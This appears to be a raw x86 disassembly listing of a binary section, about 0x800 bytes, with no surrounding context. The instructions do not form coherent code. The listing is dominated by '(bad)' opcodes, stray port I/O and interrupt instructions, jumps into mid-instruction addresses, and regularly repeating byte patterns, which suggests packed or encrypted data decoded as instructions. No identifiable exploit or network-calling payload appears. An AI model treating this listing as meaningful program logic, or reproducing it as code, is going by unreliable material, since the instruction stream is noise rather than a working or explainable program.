  412e0c:	test   BYTE PTR [ebx-0x4f],cl
  412e0f:	pop    edi
  412e10:	adc    eax,0x43b06248
  412e15:	push   ecx
  412e16:	out    0x4e,eax
  412e18:	pop    esp
  412e19:	inc    ecx
  412e1a:	add    esp,DWORD PTR [edx-0x70]
  412e1d:	inc    edx
  412e1e:	inc    ecx
  412e1f:	inc    eax
  412e20:	add    eax,0x41624340
  412e25:	test   BYTE PTR [eax],al
  412e27:	and    eax,0x404043
  412e2c:	add    BYTE PTR ds:0x626210,al
  412e32:	add    eax,0x43404140
  412e37:	inc    eax
  412e38:	inc    ecx
  412e39:	add    eax,0x10664062
  412e3e:	inc    ebx
  412e3f:	bound  ebx,QWORD PTR [ecx]
  412e41:	mov    edi,0x42243253
  412e46:	lock in eax,0x47
  412e49:	lahf   
  412e4a:	int    0x2c
  412e4c:	push   edx
  412e4d:	sub    al,BYTE PTR [ebx+0x7a]
  412e50:	cmc    
  412e51:	inc    edi
  412e52:	adc    DWORD PTR [ebp+0x30],esi
  412e55:	inc    ecx
  412e56:	shl    DWORD PTR [edi-0xaa7ac12],1
  412e5c:	adc    BYTE PTR [edi-0x15],ch
  412e5f:	xor    bl,dh
  412e61:	push   es
  412e62:	xor    bh,BYTE PTR ds:0xcc05d364
  412e68:	inc    ecx
  412e69:	inc    eax
  412e6a:	add    BYTE PTR [eax],al
  412e6c:	add    BYTE PTR [eax+0x40],al
  412e6f:	inc    ebx
  412e70:	bound  eax,QWORD PTR [eax]
  412e72:	inc    eax
  412e73:	inc    eax
  412e74:	add    eax,0x62434162
  412e79:	inc    eax
  412e7a:	js     0x412e8c
  412e7c:	inc    ecx
  412e7d:	add    eax,0x5404325
  412e82:	bound  eax,QWORD PTR [eax+0x40]
  412e85:	inc    ecx
  412e86:	inc    ebx
  412e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e88:	xchg   BYTE PTR [edi-0x4c873201],bh
  412e8e:	bound  ecx,QWORD PTR [ecx]
  412e90:	mov    esp,ecx
  412e92:	push   es
  412e93:	int    0x3c
  412e95:	lock mov ds:0xff33c4a6,eax
  412e9b:	inc    eax
  412e9c:	gs and eax,0x436241
  412ea2:	adc    BYTE PTR [eax+0x0],al
  412ea5:	add    eax,0x62410040
  412eaa:	inc    eax
  412eab:	add    BYTE PTR [ebx-0x34],al
  412eae:	inc    eax
  412eaf:	add    eax,0x78434040
  412eb4:	bound  eax,QWORD PTR [ecx+0x78]
  412eb7:	add    eax,0x62404043
  412ebc:	jmp    0x66e6fe5
  412ec1:	sbb    ebp,DWORD PTR [edx]
  412ec3:	jno    0x412f41
  412ec5:	rol    DWORD PTR [ebx-0x40],0xb3
  412ec9:	xlat   BYTE PTR ds:[ebx]
  412eca:	inc    ecx
  412ecb:	xor    BYTE PTR [ecx+0x217930f0],ch
  412ed1:	jnp    0x412f42
  412ed3:	gs push esp
  412ed5:	arpl   sp,bp
  412ed7:	jae    0x412f0e
  412ed9:	xchg   ebp,eax
  412eda:	nop
  412edb:	arpl   WORD PTR [edx+0x69],ax
  412ede:	inc    edi
  412edf:	add    eax,0x540410b
  412ee4:	inc    eax
  412ee5:	bound  eax,QWORD PTR [ebx+0x43]
  412ee8:	add    eax,0x62004040
  412eed:	inc    eax
  412eee:	add    BYTE PTR [ecx+0x40],al
  412ef1:	inc    ebx
  412ef2:	test   BYTE PTR ds:0x58054041,ah
  412ef8:	inc    eax
  412ef9:	inc    eax
  412efa:	bound  eax,QWORD PTR [eax+0x66]
  412efd:	inc    ecx
  412efe:	inc    eax
  412eff:	add    eax,0xc8524000
  412f04:	jl     0x412eb6
  412f06:	test   DWORD PTR [edi+0x353ef0f3],edi
  412f0c:	jbe    0x412f71
  412f0e:	inc    ebx
  412f0f:	icebp  
  412f10:	fs sub esp,ecx
  412f13:	sbb    eax,0x4290bf63
  412f18:	adc    DWORD PTR [edi+ebp*2],ebx
  412f1b:	test   al,0x7c
  412f1d:	lds    ecx,FWORD PTR [ebp-0x632ea486]
  412f23:	pop    esi
  412f24:	gs dec edi
  412f26:	inc    ebx
  412f27:	push   ebx
  412f28:	sar    DWORD PTR [ebp+0x63763752],1
  412f2e:	rcl    DWORD PTR [ecx],1
  412f30:	pop    ebx
  412f31:	pop    ecx
  412f32:	aad    0x90
  412f34:	add    BYTE PTR [eax],al
  412f36:	inc    ebx
  412f37:	inc    eax
  412f38:	bound  eax,QWORD PTR ds:0x25404110
  412f3e:	add    ah,cl
  412f40:	inc    ebx
  412f41:	add    eax,0x40402562
  412f46:	add    BYTE PTR [eax+0x40],al
  412f49:	inc    ecx
  412f4a:	inc    ecx
  412f4b:	add    eax,0x78434025
  412f50:	bound  eax,QWORD PTR [eax-0x7c]
  412f53:	inc    eax
  412f54:	inc    ecx
  412f55:	xor    al,0x4b
  412f57:	bound  esp,QWORD PTR [ebx+0x71]
  412f5a:	xor    dh,cl
  412f5c:	mov    edi,0xd90a6268
  412f61:	inc    edi
  412f62:	xor    ch,BYTE PTR [ecx]
  412f64:	inc    esp
  412f65:	(bad)  
  412f66:	adc    eax,0x4e51566d
  412f6b:	inc    ecx
  412f6c:	inc    eax
  412f6d:	inc    eax
  412f6e:	inc    ebx
  412f6f:	int3   
  412f70:	add    BYTE PTR ds:0x56240,al
  412f76:	inc    ebx
  412f77:	inc    eax
  412f78:	inc    eax
  412f79:	add    BYTE PTR [ecx+0x62],al
  412f7c:	bound  eax,QWORD PTR [eax]
  412f7e:	int3   
  412f7f:	inc    eax
  412f80:	inc    ebx
  412f81:	add    eax,0x43624041
  412f86:	adc    BYTE PTR [ecx+0x5],al
  412f89:	inc    eax
  412f8a:	cmp    bl,BYTE PTR gs:[eax]
  412f8d:	enter  0x5e88,0xbf
  412f91:	adc    DWORD PTR [ebp-0x40],ebp
  412f94:	arpl   WORD PTR [ebx+0x41],sp
  412f97:	jne    0x412fe1
  412f99:	push   ecx
  412f9a:	dec    esp
  412f9b:	inc    edx
  412f9c:	mov    dh,0xe
  412f9e:	inc    ebx
  412f9f:	pop    esp
  412fa0:	jno    0x412f33
  412fa2:	push   edx
  412fa3:	and    DWORD PTR [eax+0x687230dc],ecx
  412fa9:	add    cl,bh
  412fab:	into   
  412fac:	bound  esp,QWORD PTR [edx-0x18]
  412faf:	fdivrp st(1),st
  412fb1:	cdq    
  412fb2:	mov    ah,0xa8
  412fb4:	mov    esp,0x6da5474b
  412fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fba:	jo     0x41300b
  412fbc:	mov    al,0x30
  412fbe:	test   DWORD PTR [ebp+edx*1+0x40436274],edx
  412fc5:	adc    BYTE PTR ds:0x4158cc40,al
  412fcb:	inc    ebx
  412fcc:	bound  eax,QWORD PTR [ecx+0x40]
  412fcf:	add    eax,0x4140
  412fd4:	and    eax,0x40400062
  412fd9:	add    eax,0x84404340
  412fde:	int3   
  412fdf:	js     0x412fe1
  412fe1:	inc    ecx
  412fe2:	adc    BYTE PTR [edx+0xf],ah
  412fe5:	and    BYTE PTR [edx],ah
  412fe7:	xchg   ecx,eax
  412fe8:	in     al,dx
  412fe9:	pusha  
  412fea:	mov    al,ds:0x46520e6f
  412fef:	bound  esp,QWORD PTR [ecx+0xab3bef0]
  412ff5:	fcomp  st(4)
  412ff7:	imul   ebp,DWORD PTR [eax-0x44bd055d],0xf5646ca8
  413001:	stos   BYTE PTR es:[edi],al
  413002:	loopne 0x412fb7
  413004:	std    
  413005:	jo     0x41304d
  413007:	push   ebx
  413008:	retf   
  413009:	test   al,0x71
  41300b:	dec    edi
  41300c:	jg     0x413022
  41300e:	fnsave [esi+0xa34052]
  413014:	inc    eax
  413015:	inc    ecx
  413016:	inc    eax
  413017:	inc    ebx
  413018:	bound  ax,DWORD PTR ds:0x40434100
  41301f:	add    eax,0x40054062
  413024:	bound  eax,QWORD PTR [ecx+0x40]
  413027:	inc    ebx
  413028:	inc    eax
  413029:	add    eax,0x25405841
  41302e:	bound  eax,QWORD PTR [eax+0x43]
  413031:	inc    eax
  413032:	adc    BYTE PTR [ebp-0x21],dh
  413035:	push   edx
  413036:	fisttp WORD PTR [eax+0x51bf2a40]
  41303c:	dec    eax
  41303d:	pop    edx
  41303e:	xor    DWORD PTR [edx-0x37],esp
  413041:	dec    esp
  413042:	and    dl,BYTE PTR [ecx-0x47264f09]
  413048:	sub    BYTE PTR [edx],ch
  41304a:	adc    edi,DWORD PTR gs:[ecx+0x70]
  41304e:	push   ecx
  41304f:	inc    eax
  413050:	inc    ecx
  413051:	inc    ebx
  413052:	inc    eax
  413053:	add    eax,0x43406262
  413058:	inc    ecx
  413059:	adc    BYTE PTR [eax],al
  41305b:	inc    eax
  41305c:	add    eax,0x43000562
  413061:	add    BYTE PTR [ecx+0x40],al
  413064:	inc    eax
  413065:	add    eax,0x400062
  41306a:	inc    ebx
  41306b:	inc    eax
  41306c:	js     0x4130af
  41306e:	inc    ecx
  41306f:	bound  eax,QWORD PTR [eax-0x50]
  413072:	adc    BYTE PTR [edx+0x4a],cl
  413075:	rcr    DWORD PTR [ecx-0xfcacaec],1
  41307b:	lods   eax,DWORD PTR ds:[esi]
  41307c:	test   al,0xbf
  41307e:	add    al,0x52
  413080:	pusha  
  413081:	bound  eax,QWORD PTR ds:0xbf080074
  413087:	int    0x7e
  413089:	push   es
  41308a:	int    0xfe
  41308c:	mov    bl,0x51
  41308e:	dec    edi
  41308f:	inc    edx
  413090:	bound  esp,QWORD PTR [edx+edx*1-0x40bf69b8]
  413097:	std    
  413098:	jne    0x4130fc
  41309a:	nop
  41309b:	inc    ebx
  41309c:	pushf  
  41309d:	mov    bl,0x46
  41309f:	dec    ebp
  4130a0:	bound  eax,QWORD PTR [eax+0x5]
  4130a3:	inc    ecx
  4130a4:	add    BYTE PTR [ebx+0x40],al
  4130a7:	inc    eax
  4130a8:	inc    ecx
  4130a9:	inc    eax
  4130aa:	inc    eax
  4130ab:	bound  eax,QWORD PTR ds:0x5624300
  4130b1:	add    BYTE PTR [eax+0x40],al
  4130b4:	add    BYTE PTR [ecx+0x43],al
  4130b7:	add    BYTE PTR [eax+0x41],al
  4130ba:	add    eax,0x40436200
  4130bf:	inc    eax
  4130c0:	add    eax,0x47bcd062
  4130c5:	xor    BYTE PTR [eax+ebx*2+0x6652c38],dl
  4130cc:	or     eax,0x69323d0
  4130d1:	pushf  
  4130d2:	pop    esp
  4130d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d4:	test   BYTE PTR [edi-0x30],al
  4130d7:	fs inc edi
  4130d9:	adc    BYTE PTR [esi+0x63],ah
  4130dc:	test   DWORD PTR fs:[edi+0x51],ecx
  4130e0:	lock mov cl,0x41
  4130e3:	inc    eax
  4130e4:	add    eax,0x41624340
  4130e9:	test   BYTE PTR [eax],al
  4130eb:	and    eax,0x404043
  4130f0:	add    BYTE PTR ds:0x626210,al
  4130f6:	add    eax,0x43404140
  4130fb:	inc    eax
  4130fc:	inc    ecx
  4130fd:	add    eax,0x10664062
  413102:	inc    ebx
  413103:	(bad)  
  413104:	clc    
  413105:	cmp    DWORD PTR [edi],esi
  413107:	inc    ebx
  413108:	fnstsw WORD PTR [ebp-0x43]
  41310b:	jo     0x41312d
  41310d:	cld    
  41310e:	js     0x4130a0
  413110:	xor    al,0xd5
  413112:	je     0x413128
  413114:	lods   al,BYTE PTR ds:[esi]
  413115:	gs inc di
  413118:	stos   BYTE PTR es:[edi],al
  413119:	sub    al,0x6a
  41311b:	push   edx
  41311c:	add    eax,0xab436d2a
  413121:	sti    
  413122:	repz pop es
  413124:	retf   
  413125:	aaa    
  413126:	add    eax,0x4041cc
  41312b:	add    BYTE PTR [eax],al
  41312d:	inc    eax
  41312e:	inc    eax
  41312f:	inc    ebx
  413130:	bound  eax,QWORD PTR [eax]
  413132:	inc    eax
  413133:	inc    eax
  413134:	add    eax,0x62434162
  413139:	inc    eax
  41313a:	js     0x41314c
  41313c:	inc    ecx
  41313d:	add    eax,0x5404325
  413142:	bound  eax,QWORD PTR [eax+0x40]
  413145:	inc    ecx
  413146:	inc    ebx
  413147:	or     cl,dl
  413149:	nop
  41314a:	bound  ebp,QWORD PTR [ebp-0x70]
  41314d:	pop    eax
  41314e:	jnp    0x4131b2
  413150:	(bad)  
  413151:	scas   eax,DWORD PTR es:[edi]
  413152:	adc    DWORD PTR [ebx+0x10d21548],edx
  413158:	enter  0x5af0,0x6b
  41315c:	cmp    al,0xcb
  41315e:	inc    ebp
  41315f:	push   eax
  413160:	pop    esi
  413161:	mov    dl,cl
  413163:	jg     0x4130fd
  413165:	push   edi
  413166:	xor    al,0x65
  413168:	mov    ds,WORD PTR [edi-0x41]
  41316b:	push   ebp
  41316c:	fadd   DWORD PTR [eax+eax*8+0x5]
  413170:	inc    ecx
  413171:	mov    eax,0x6ea9512c
  413176:	and    eax,0x436241
  41317b:	adc    BYTE PTR [eax+0x0],al
  41317e:	add    eax,0x62410040
  413183:	inc    eax
  413184:	add    BYTE PTR [ebx-0x34],al
  413187:	inc    eax
  413188:	add    eax,0x78434040
  41318d:	bound  eax,QWORD PTR [ecx+0x78]
  413190:	add    eax,0x62404043
  413195:	cmp    BYTE PTR [edi+0x759f8a43],al
  41319b:	cli    
  41319c:	fdivr  QWORD PTR [eax+edi*8+0x30]
  4131a0:	outs   dx,BYTE PTR ds:[esi]
  4131a1:	inc    ebx
  4131a2:	cmc    
  4131a3:	sub    BYTE PTR [ebp+0x7a],bl
  4131a6:	or     eax,0xe89112cc
  4131ab:	bound  eax,QWORD PTR [ebp-0xf]
  4131ae:	leave  
  4131af:	inc    edi
  4131b0:	sti    
  4131b1:	sbb    al,0x73
  4131b3:	lds    esp,FWORD PTR [ebp-0x527a67f5]
  4131b9:	sbb    ebp,DWORD PTR [ebx]
  4131bb:	ins    DWORD PTR es:[edi],dx
  4131bc:	js     0x41315a
  4131be:	inc    ebx
  4131bf:	inc    ebx
  4131c0:	jmp    0xbe6f2511
  4131c5:	clc    
  4131c6:	jle    0x413158
  4131c8:	dec    ebx
  4131c9:	push   ebx
  4131ca:	aas    
  4131cb:	inc    ecx
  4131cc:	inc    eax
  4131cd:	add    eax,0x43436240
  4131d2:	add    eax,0x62004040
  4131d7:	inc    eax
  4131d8:	add    BYTE PTR [ecx+0x40],al
  4131db:	inc    ebx
  4131dc:	test   BYTE PTR ds:0x58054041,ah
  4131e2:	inc    eax
  4131e3:	inc    eax
  4131e4:	bound  eax,QWORD PTR [eax+0x66]
  4131e7:	inc    ecx
  4131e8:	inc    eax
  4131e9:	add    eax,0xe4255400
  4131ee:	dec    esp
  4131ef:	fs xchg esp,eax
  4131f1:	push   esp
  4131f2:	gs clc 
  4131f4:	push   0x2043643a
  4131f9:	adc    BYTE PTR [ecx+0x70],bh
  4131fc:	xchg   edi,eax
  4131fd:	(bad)  
  4131fe:	add    BYTE PTR [eax],al
  413200:	inc    ebx
  413201:	inc    eax
  413202:	bound  eax,QWORD PTR ds:0x25404110
  413208:	add    ah,cl
  41320a:	inc    ebx
  41320b:	add    eax,0x40402562
  413210:	add    BYTE PTR [eax+0x40],al
  413213:	inc    ecx
  413214:	inc    ecx
  413215:	add    eax,0x78434025
  41321a:	bound  eax,QWORD PTR [eax-0x7c]
  41321d:	inc    eax
  41321e:	inc    ecx
  41321f:	cld    
  413220:	rcr    DWORD PTR [ebx+0x8],1
  413223:	dec    eax
  413224:	adc    eax,0x790511a8
  413229:	mov    BYTE PTR [eax-0xf],al
  41322c:	push   edx
  41322d:	adc    cl,ch
  41322f:	xchg   DWORD PTR [ebp+0x561c51e3],ebx
  413235:	mov    eax,0x273440e1
  41323a:	add    esi,DWORD PTR ds:0x415242a0
  413240:	int    0x6b
  413242:	pop    ds
  413243:	bound  esi,QWORD PTR [eax+0x5c]
  413246:	mov    al,ds:0xbb1e4109
  41324b:	inc    ecx
  41324c:	inc    eax
  41324d:	inc    eax
  41324e:	inc    ebx
  41324f:	int3   
  413250:	add    BYTE PTR ds:0x56240,al
  413256:	inc    ebx
  413257:	inc    eax
  413258:	inc    eax
  413259:	add    BYTE PTR [ecx+0x62],al
  41325c:	bound  eax,QWORD PTR [eax]
  41325e:	int3   
  41325f:	inc    eax
  413260:	inc    ebx
  413261:	add    eax,0x43624041
  413266:	adc    BYTE PTR [ecx+0x5],al
  413269:	inc    eax
  41326a:	repz adc al,0x3c
  41326d:	dec    ecx
  41326e:	pop    eax
  41326f:	inc    ebx
  413270:	jae    0x413275
  413272:	pop    ebx
  413273:	push   edx
  413274:	inc    ecx
  413275:	push   edx
  413276:	bound  esi,QWORD PTR [eax]
  413278:	cwde   
  413279:	pop    ds
  41327a:	push   ebx
  41327b:	push   0xc87ec19b
  413280:	jbe    0x413285
  413282:	pop    ebx
  413283:	mov    al,ds:0x474c29c1
  413288:	(bad)  
  413289:	pop    ds
  41328a:	pop    edi
  41328b:	jo     0x41329f
  41328d:	stos   DWORD PTR es:[edi],eax
  41328e:	test   DWORD PTR fs:[ebx],eax
  413291:	add    eax,ecx
  413293:	adc    al,0xac
  413295:	mov    ah,0xf0
  413297:	inc    ebx
  413298:	repnz pop ds
  41329a:	xor    eax,0x10404362
  41329f:	add    eax,0x4158cc40
  4132a4:	inc    ebx
  4132a5:	bound  eax,QWORD PTR [ecx+0x40]
  4132a8:	add    eax,0x4140
  4132ad:	and    eax,0x40400062
  4132b2:	add    eax,0x84404340
  4132b7:	int3   
  4132b8:	js     0x4132ba
  4132ba:	inc    ecx
  4132bb:	adc    BYTE PTR [edx+0xf],ah
  4132be:	push   edx
  4132bf:	adc    eax,0x82906e05
  4132c4:	dec    eax
  4132c5:	cwde   
  4132c6:	push   0x145cbcd
  4132cb:	add    BYTE PTR [edi],bh
  4132cd:	push   ecx
  4132ce:	mov    al,ds:0x43634540
  4132d3:	mov    cs,WORD PTR [eax-0x41]
  4132d6:	jo     0x413302
  4132d8:	inc    ebx
  4132d9:	aaa    
  4132da:	sar    edx,1
  4132dc:	mov    edi,0x91431465
  4132e1:	jle    0x413301
  4132e3:	pop    DWORD PTR [ebx]
  4132e5:	add    BYTE PTR [eax+0x41],al
  4132e8:	inc    eax
  4132e9:	inc    ebx
  4132ea:	bound  ax,DWORD PTR ds:0x40434100
  4132f1:	add    eax,0x40054062
  4132f6:	bound  eax,QWORD PTR [ecx+0x40]
  4132f9:	inc    ebx
  4132fa:	inc    eax
  4132fb:	add    eax,0x25405841
  413300:	bound  eax,QWORD PTR [eax+0x43]
  413303:	inc    eax
  413304:	adc    cl,dl
  413306:	push   edx
  413307:	or     bh,al
  413309:	dec    ebp
  41330a:	sub    eax,0x687d1ff5
  41330f:	mov    BYTE PTR [edi+0x6f],dh
  413312:	inc    edx
  413313:	push   ds
  413314:	jno    0x413369
  413316:	sbb    BYTE PTR [esi],0x7c
  413319:	in     eax,dx
  41331a:	mov    edx,0x44797845
  41331f:	xor    al,0x6b
  413321:	jle    0x413364
  413323:	xchg   edx,eax
  413324:	shr    DWORD PTR es:[eax+eax*4],cl
  413328:	arpl   WORD PTR [ecx],bx
  41332a:	inc    ebx
  41332b:	fs inc eax
  41332d:	inc    ecx
  41332e:	inc    ebx
  41332f:	inc    eax
  413330:	add    eax,0x43406262
  413335:	inc    ecx
  413336:	adc    BYTE PTR [eax],al
  413338:	inc    eax
  413339:	add    eax,0x43000562
  41333e:	add    BYTE PTR [ecx+0x40],al
  413341:	inc    eax
  413342:	add    eax,0x400062
  413347:	inc    ebx
  413348:	inc    eax
  413349:	js     0x41338c
  41334b:	inc    ecx
  41334c:	bound  eax,QWORD PTR [eax-0x42]
  41334f:	fimul  WORD PTR [ebp+eax*8-0x9cf2924]
  413356:	dec    ecx
  413357:	aad    0xcd
  413359:	xchg   ecx,eax
  41335a:	popa   
  41335b:	push   0xffffffc4
  41335d:	addr16 icebp 
  41335f:	dec    edi
  413360:	inc    ebp
  413361:	inc    edx
  413362:	ins    BYTE PTR es:[edi],dx
  413363:	cmp    eax,DWORD PTR [edi-0x77]
  413366:	adc    esi,ecx
  413368:	repnz inc ebp
  41336a:	test   BYTE PTR gs:[ebp+0x5f88508e],al
  413371:	and    al,0xf2
  413373:	bound  eax,QWORD PTR [ebx-0x79]
  413376:	ins    DWORD PTR es:[edi],dx
  413377:	icebp  
  413378:	and    al,dh
  41337a:	stos   DWORD PTR es:[edi],eax
  41337b:	ficom  WORD PTR [eax-0x75aaa1b4]
  413381:	enter  0x4062,0x5
  413385:	inc    ecx
  413386:	add    BYTE PTR [ebx+0x40],al
  413389:	inc    eax
  41338a:	inc    ecx
  41338b:	inc    eax
  41338c:	inc    eax
  41338d:	bound  eax,QWORD PTR ds:0x5624300
  413393:	add    BYTE PTR [eax+0x40],al
  413396:	add    BYTE PTR [ecx+0x43],al
  413399:	add    BYTE PTR [eax+0x41],al
  41339c:	add    eax,0x40436200
  4133a1:	inc    eax
  4133a2:	add    eax,0x1e254262
  4133a7:	ret    
  4133a8:	xor    DWORD PTR [ecx-0x254bab3],esi
  4133ae:	inc    edi
  4133af:	fisubr WORD PTR [edx]
  4133b1:	shl    BYTE PTR [ecx-0x3a96beda],0xb0
  4133b8:	push   ebx
  4133b9:	shl    DWORD PTR [eax+0x41],1
  4133bc:	(bad)  
  4133be:	push   esi
  4133bf:	cmp    BYTE PTR [ecx+0x40],al
  4133c2:	add    eax,0x41624340
  4133c7:	test   BYTE PTR [eax],al
  4133c9:	and    eax,0x404043
  4133ce:	add    BYTE PTR ds:0x626210,al
  4133d4:	add    eax,0x43404140
  4133d9:	inc    eax
  4133da:	inc    ecx
  4133db:	add    eax,0x10664062
  4133e0:	inc    ebx
  4133e1:	(bad)  
  4133e2:	fidivr DWORD PTR [edi-0x23cb57ec]
  4133e8:	add    esi,DWORD PTR [ecx+0x79525fd1]
  4133ee:	arpl   WORD PTR [ebp+0x1539d7ca],dx
  4133f4:	push   0x608c0526
  4133f9:	call   0x41c16053
  4133fe:	xchg   DWORD PTR [eax],ebp
  413400:	inc    ecx
  413401:	jmp    0x2aa4cc0a
  413406:	dec    ecx
  413407:	lods   al,BYTE PTR ds:[esi]
  413408:	inc    ebx
  413409:	jge    0x41346a
  41340b:	inc    ebx
  41340c:	xor    BYTE PTR [edx],dl
  41340e:	stos   DWORD PTR es:[edi],eax
  41340f:	ret    
  413410:	xor    BYTE PTR [esi-0x61],bh
  413413:	pop    ds
  413414:	xchg   BYTE PTR [eax+0x41cc05b8],ch
  41341a:	inc    eax
  41341b:	add    BYTE PTR [eax],al
  41341d:	add    BYTE PTR [eax+0x40],al
  413420:	inc    ebx
  413421:	bound  eax,QWORD PTR [eax]
  413423:	inc    eax
  413424:	inc    eax
  413425:	add    eax,0x62434162
  41342a:	inc    eax
  41342b:	js     0x41343d
  41342d:	inc    ecx
  41342e:	add    eax,0x5404325
  413433:	bound  eax,QWORD PTR [eax+0x40]
  413436:	inc    ecx
  413437:	inc    ebx
  413438:	and    eax,0x370421d4
  41343d:	xor    eax,0x47ff0d15
  413442:	pop    ecx
  413443:	pop    edi
  413444:	dec    ebp
  413445:	ror    ebx,0xc9
  413448:	dec    esp
  413449:	test   DWORD PTR [ebp+0x7a],eax
  41344c:	adc    eax,0xf090436d
  413451:	inc    ebx
  413452:	retf   0x4e9f
  413455:	and    BYTE PTR [ebx],bh
  413457:	inc    ecx
  413458:	addr16 nop
  41345a:	push   edx
  41345b:	add    al,0x3d
  41345d:	push   edx
  41345e:	je     0x41346c
  413460:	dec    edx
  413461:	cmp    ebp,DWORD PTR [eax]
  413463:	pop    edi
  413464:	dec    edi
  413465:	retf   
  413466:	(bad)  
  413467:	int    0x4c
  413469:	test   al,0x25
  41346b:	inc    ecx
  41346c:	bound  eax,QWORD PTR [ebx+0x0]
  41346f:	adc    BYTE PTR [eax+0x0],al
  413472:	add    eax,0x62410040
  413477:	inc    eax
  413478:	add    BYTE PTR [ebx-0x34],al
  41347b:	inc    eax
  41347c:	add    eax,0x78434040
  413481:	bound  eax,QWORD PTR [ecx+0x78]
  413484:	add    eax,0x62404043
  413489:	cs jp  0x4134c1
  41348c:	test   BYTE PTR [edi+0x1b406c48],al
  413492:	pop    ds
  413493:	dec    ecx
  413494:	jno    0x413472
  413496:	inc    eax
  413497:	sub    al,0x2a
  413499:	repnz aad 0x73
  41349c:	sub    al,0x47
  41349e:	add    al,0xdc
  4134a0:	inc    edi
  4134a1:	dec    eax
  4134a2:	std    
  4134a3:	scas   eax,DWORD PTR es:[edi]
  4134a4:	adc    ah,0x67
  4134a7:	mov    WORD PTR [edx],gs
  4134a9:	jl     0x413516
  4134ab:	inc    ecx
  4134ac:	inc    eax
  4134ad:	add    eax,0x43436240
  4134b2:	add    eax,0x62004040
  4134b7:	inc    eax
  4134b8:	add    BYTE PTR [ecx+0x40],al
  4134bb:	inc    ebx
  4134bc:	test   BYTE PTR ds:0x58054041,ah
  4134c2:	inc    eax
  4134c3:	inc    eax
  4134c4:	bound  eax,QWORD PTR [eax+0x66]
  4134c7:	inc    ecx
  4134c8:	inc    eax
  4134c9:	add    eax,0xd5561000
  4134ce:	dec    edx
  4134cf:	dec    ecx
  4134d0:	stc    
  4134d1:	inc    ebx
  4134d2:	push   ebx
  4134d3:	xlat   BYTE PTR ds:[ebx]
  4134d4:	lods   eax,DWORD PTR ds:[esi]
  4134d5:	inc    edi
  4134d6:	mov    eax,0xd12ef751
  4134db:	push   esp
  4134dc:	jo     0x413513
  4134de:	or     eax,0xd12d4c73
  4134e3:	jno    0x4134d9
  4134e5:	nop
  4134e6:	sub    ecx,DWORD PTR [ecx+0x5e]
  4134e9:	retf   0xf820
  4134ec:	push   edx
  4134ed:	ss push esi
  4134ef:	fadd   QWORD PTR [eax]
  4134f1:	add    BYTE PTR [ebx+0x40],al
  4134f4:	bound  eax,QWORD PTR ds:0x25404110
  4134fa:	add    ah,cl
  4134fc:	inc    ebx
  4134fd:	add    eax,0x40402562
  413502:	add    BYTE PTR [eax+0x40],al
  413505:	inc    ecx
  413506:	inc    ecx
  413507:	add    eax,0x78434025
  41350c:	bound  eax,QWORD PTR [eax-0x7c]
  41350f:	inc    eax
  413510:	inc    ecx
  413511:	inc    edi
  413512:	sbb    eax,0x21cdd171
  413517:	aas    
  413518:	addr16 inc ebx
  41351a:	jecxz  0x4134db
  41351c:	pop    edi
  41351d:	xor    al,0xe8
  41351f:	jns    0x413562
  413521:	xor    BYTE PTR [edi],bl
  413523:	repz xchg ebp,eax
  413525:	in     eax,0xc0
  413527:	mov    eax,0xb36ac07d
  41352c:	inc    edi
  41352d:	gs inc edi
  41352f:	ret    
  413530:	jo     0x413579
  413532:	jecxz  0x41359e
  413534:	xchg   edx,eax
  413535:	out    dx,eax
  413536:	ss inc edx
  413538:	jl     0x4134bf
  41353a:	fwait
  41353b:	cmc    
  41353c:	inc    ecx
  41353d:	inc    eax
  41353e:	inc    eax
  41353f:	inc    ebx
  413540:	int3   
  413541:	add    BYTE PTR ds:0x56240,al
  413547:	inc    ebx
  413548:	inc    eax
  413549:	inc    eax
  41354a:	add    BYTE PTR [ecx+0x62],al
  41354d:	bound  eax,QWORD PTR [eax]
  41354f:	int3   
  413550:	inc    eax
  413551:	inc    ebx
  413552:	add    eax,0x43624041
  413557:	adc    BYTE PTR [ecx+0x5],al
  41355a:	inc    eax
  41355b:	outs   dx,BYTE PTR ds:[esi]
  41355c:	les    ebp,FWORD PTR [ebx-0x2]
  41355f:	cmp    al,0x43
  413561:	xchg   esi,eax
  413562:	dec    edx
  413563:	dec    eax
  413564:	bound  ebp,QWORD PTR [eax+0x2a90634f]
  41356a:	mov    cl,0x50
  41356c:	push   esi
  41356d:	inc    ecx
  41356e:	mov    esp,0x6a9fd85a
  413573:	sub    eax,0xf44a2aac
  413578:	inc    ebx
  413579:	dec    ecx
  41357a:	cmc    
  41357b:	mov    edx,0x703c4870
  413580:	rcr    ebp,1
  413582:	pop    edx
  413583:	inc    ebp
  413584:	call   0xa54995b3
  413589:	pop    edi
  41358a:	jae    0x41357e
  41358c:	push   edx
  41358d:	inc    ebx
  41358e:	push   edx
  41358f:	adc    al,0x59
  413591:	aad    0x62
  413593:	inc    ebx
  413594:	inc    eax
  413595:	adc    BYTE PTR ds:0x4158cc40,al
  41359b:	inc    ebx
  41359c:	bound  eax,QWORD PTR [ecx+0x40]
  41359f:	add    eax,0x4140
  4135a4:	and    eax,0x40400062
  4135a9:	add    eax,0x84404340
  4135ae:	int3   
  4135af:	js     0x4135b1
  4135b1:	inc    ecx
  4135b2:	adc    BYTE PTR [edx+0xf],ah
  4135b5:	add    ebp,DWORD PTR [esi+0x3d]
  4135b8:	mov    bl,0xcb
  4135ba:	bound  ebx,QWORD PTR [ebp+0x5a]
  4135bd:	xor    ecx,DWORD PTR [edx-0x4c]
  4135c0:	xor    al,0x64
  4135c2:	dec    esp
  4135c3:	fs dec esi
  4135c5:	push   ebx
  4135c6:	pop    edx
  4135c7:	jo     0x4135fe
  4135c9:	cmp    al,0xe8
  4135cb:	inc    ecx
  4135cc:	stos   DWORD PTR es:[edi],eax
  4135cd:	mov    cl,0x22
  4135cf:	call   0x439ca6a0
  4135d4:	out    dx,eax
  4135d5:	gs inc edx
  4135d7:	push   edx
  4135d8:	arpl   WORD PTR [ecx-0xaa2cfb8],di
  4135de:	mov    bl,0x63
  4135e0:	inc    eax
  4135e1:	ret    
  4135e2:	add    BYTE PTR [eax+0x41],al
  4135e5:	inc    eax
  4135e6:	inc    ebx
  4135e7:	bound  ax,DWORD PTR ds:0x40434100
  4135ee:	add    eax,0x40054062
  4135f3:	bound  eax,QWORD PTR [ecx+0x40]
  4135f6:	inc    ebx
  4135f7:	inc    eax
  4135f8:	add    eax,0x25405841
  4135fd:	bound  eax,QWORD PTR [eax+0x43]
  413600:	inc    eax
